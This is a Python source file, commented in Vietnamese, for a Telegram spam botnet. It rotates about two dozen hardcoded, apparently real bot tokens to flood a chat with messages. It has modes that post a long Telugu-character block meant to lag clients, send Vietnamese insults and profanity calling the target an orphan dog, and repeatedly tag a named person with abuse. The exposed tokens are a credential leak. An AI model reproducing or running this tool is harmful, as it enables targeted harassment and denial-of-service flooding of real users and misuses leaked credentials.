import telebot
import threading
from flask import Flask
import time
import requests
import itertools

# --- HỆ THỐNG TOKEN ---
RAW_TOKENS = [
    '8429960682:AAHltNvwWjEn1QC_f5R8JPgz7uN1uFhny18', '8481938728:AAGen1t8Tz3jeu02kJ8HoCIZLiPLdd687n8',
    '8739448460:AAGNLEW-WDvatbxmPLzkziG5jpd5hTRfqiE', '8689807630:AAEoXvm45QaW1jlT-H_KzNlmCpu50Q3k2S4',
    '8575475228:AAHRtsOcCEQInRvR3isSBV-Igur-WykB_PE', '8651553692:AAGNQwqUoWgV1QV0ozaZHLRL0RJm9M8q0e0',
    '8712129360:AAEgW2hBbtsgY8DyMd9mxYw1B6X8_VBpF-g', '8716604939:AAH2isXOrU_J8gyRlrsqnfem6Y4F3eUwg_0',
    '8734778356:AAF1ZZbigLFn4TDKnFPJ7KIhSRNT2b8UFnc', '8750340566:AAG_fJhmqgs1X67kJybsG3i1uBYCNELqV9c',
    '8612349553:AAFGMoIgICvQH5DK3BuFQnT9AkR8i__4kIo', '8697555066:AAEmP-XxiwDynhMgNWPsANr1hksg5mhHLhM',
    '8626439785:AAEn2pArlYu0KW9tHLETtrJUXKo2BR0hjx0', '8793582382:AAHfbcee8kt-x6OeLHqwqXP79U4PBaII0MA',
    '8397463503:AAGajcEI5H_SJ0i6mccvPT7GC-P8U5RTLOQ', '8718672219:AAH37zxnCBuWLMSEW_rCvEwnrf0ym8d7-H0',
    '8650032681:AAE9TeiIlywG796f6y6hKLN7JiBWhNgH3gc', '8303481123:AAFN_bijtWzXlR1FlYHEvgN-5uhyqnZsbu0',
    '8619086108:AAFYqRAdKNvg84eyj1ylXfa-TF8W8o8fxbo', '8661308767:AAFU__yZv8r1HlJ5jaW3URW88bWKWYKDCCY',
    '8625550674:AAHIHuakDCvvxwCC0mgrDLU5g8vBNFdD7eI', '8724848112:AAHhLYnH1LO4tVUPMTjztbNZZtni7D0uDl4',
    '8471422557:AAF30BcMF15veQPHCTDqcA1NU0iHb63Zm1o'
]

VALID_BOTS = []
ADMIN_LIST = [7153197678] # ID của ông
stop_event = threading.Event()
spam_delay = 0.1
app = Flask('')

@app.route('/')
def home(): return "SYSTEM V31 SUPREME - ONLINE"

# --- VĂN BẢN HIỆN NGUYÊN HÌNH (DÀI GẤP 2 LẦN) ---
LAG_TEXT = """
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
జ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞaజ్ఞa
"""

WAR_TEXT = """
cn choa ei=))=)) sua di con dix mo coi gáy gắt lên e ei=))=)) m mồ côi à=))=)) sua len di con dix mồ côi=))=))
m chay dau cho thoat khoi tay cha hquy=))=)) sua len di con dix mồ côi=))=))
slow vcl e ơi mồ côi gáy gắt lên=))=)) m yeu ot z tk nfu học đòi war bot=))=))
cay lam dung k nhìn màn hình nhảy chữ đi=))=)) cay di e cay di e cmm tk nfu=))=))
cmm nfu nfu nfu mồ côi sủa gắt=))=)) choa sua tiep di bố m đang đợi m đây=))=))
bố m vả nát gáo m nè con dog mồ côi gáy lên=))=))
cn choa ei=))=)) sua di con dix mo coi gáy gắt lên e ei=))=)) m mồ côi à=))=)) sua len di con dix mồ côi=))=))
m chay dau cho thoat khoi tay cha hquy=))=)) sua len di con dix mồ côi=))=))
slow vcl e ơi mồ côi gáy gắt lên=))=)) m yeu ot z tk nfu học đòi war bot=))=))
cay lam dung k nhìn màn hình nhảy chữ đi=))=)) cay di e cay di e cmm tk nfu=))=))
cmm nfu nfu nfu mồ côi sủa gắt=))=)) choa sua tiep di bố m đang đợi m đây=))=))
bố m vả nát gáo m nè con dog mồ côi gáy lên=))=))
"""

# --- ENGINE SPAM XOAY VÒNG ---
def spam_engine(chat_id, mode, custom_text, target_tag):
    bot_cycle = itertools.cycle(VALID_BOTS)
    while not stop_event.is_set():
        current_bot = next(bot_cycle)
        try:
            msg = ""
            if mode == 'lag': msg = f"{LAG_TEXT}\n[Time: {time.time()}]"
            elif mode == 'dai': msg = f"{WAR_TEXT}\n[Time: {time.time()}]"
            elif mode == 'tag': 
                msg = (f"{target_tag} sủa đi con chó mồ côi =))\n" 
                       f"{target_tag} câm à e ei =))\n"
                       f"{target_tag} gáy lên cmm mồ côi =))\n"
                       f"Ref: {time.time()}")
            elif mode == 'custom': msg = custom_text
            
            current_bot.send_message(chat_id, msg)
            
            # Check dừng liên tục
            for _ in range(int(spam_delay * 100)):
                if stop_event.is_set(): return
                time.sleep(0.01)
        except:
            time.sleep(0.01)

# --- QUẢN LÝ LỆNH TỔNG HỢP ---
def master_listener(bot_master):
    @bot_master.message_handler(func=lambda m: m.from_user.id in ADMIN_LIST)
    def handle(m):
        global spam_delay
        cmd = m.text.lower()

        # LỆNH CHIẾN ĐẤU
        if cmd == '/splag':
            stop_event.clear()
            threading.Thread(target=spam_engine, args=(m.chat.id, 'lag', "", ""), daemon=True).start()
            bot_master.send_message(m.chat.id, "🌪️ ULTRA LAG STARTED!")

        elif cmd == '/spdai':
            stop_event.clear()
            threading.Thread(target=spam_engine, args=(m.chat.id, 'dai', "", ""), daemon=True).start()
            bot_master.send_message(m.chat.id, "🔥 ULTRA WAR STARTED!")

        elif cmd.startswith('/sptag '):
            target = m.text.split(' ')[1]
            stop_event.clear()
            threading.Thread(target=spam_engine, args=(m.chat.id, 'tag', "", target), daemon=True).start()
            bot_master.send_message(m.chat.id, f"🎯 TARGETING {target}")

        elif cmd == '/dung':
            stop_event.set()
            bot_master.send_message(m.chat.id, "🛑 STOPPED ALL BOTS.")

        # LỆNH QUẢN TRỊ & HỆ THỐNG
        elif cmd == '/listadm':
            admin_msg = "👑 DANH SÁCH ADMIN:\n" + "\n".join([f"• `{uid}`" for uid in ADMIN_LIST])
            bot_master.reply_to(m, admin_msg, parse_mode="Markdown")

        elif cmd == '/help':
            h = ("📜 TỔNG HỢP LỆNH V31:\n\n"
                 "⚔️ **Chiến đấu:**\n"
                 "/splag - Xả văn bản lag siêu dài\n"
                 "/spdai - Xả văn bản war nguyên hình\n"
                 "/sptag [tên] - Tag đối thủ liên tục\n"
                 "/spam [nội dung] - Spam văn bản tùy ý\n"
                 "/dung - Dừng khẩn cấp tức thì\n\n"
                 "⚙️ **Hệ thống:**\n"
                 "/info - Xem trạng thái bốt\n"
                 "/list - Xem số lượng bốt sống\n"
                 "/listadm - Xem danh sách Admin\n"
                 "/setdelay [giây] - Chỉnh tốc độ xả\n"
                 "/addadm [id] - Thêm Admin mới\n"
                 "/xoaadm [id] - Xóa Admin")
            bot_master.reply_to(m, h, parse_mode="Markdown")

        elif cmd == '/info':
            bot_master.reply_to(m, f"📊 THÔNG SỐ:\n🤖 Bốt sống: {len(VALID_BOTS)}\n⚡ Tốc độ: {spam_delay}s")

        elif cmd.startswith('/setdelay '):
            try:
                spam_delay = float(m.text.split(' ')[1])
                bot_master.reply_to(m, f"⚡ Tốc độ mới: {spam_delay}s")
            except: pass

        elif cmd.startswith('/addadm '):
            try:
                new_id = int(m.text.split(' ')[1])
                if new_id not in ADMIN_LIST: ADMIN_LIST.append(new_id)
                bot_master.reply_to(m, f"✅ Đã thêm: {new_id}")
            except: pass

    bot_master.infinity_polling(timeout=10, skip_pending=True)

# --- KHỞI CHẠY ---
def init():
    for t in RAW_TOKENS:
        try:
            b = telebot.TeleBot(t)
            r = requests.get(f"https://api.telegram.org/bot{t}/getMe", timeout=2).json()
            if r.get("ok"): VALID_BOTS.append(b)
        except: pass
    
    if VALID_BOTS:
        print(f"--- ACTIVE: {len(VALID_BOTS)} BOTS ---")
        master_listener(VALID_BOTS[0])

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    init()
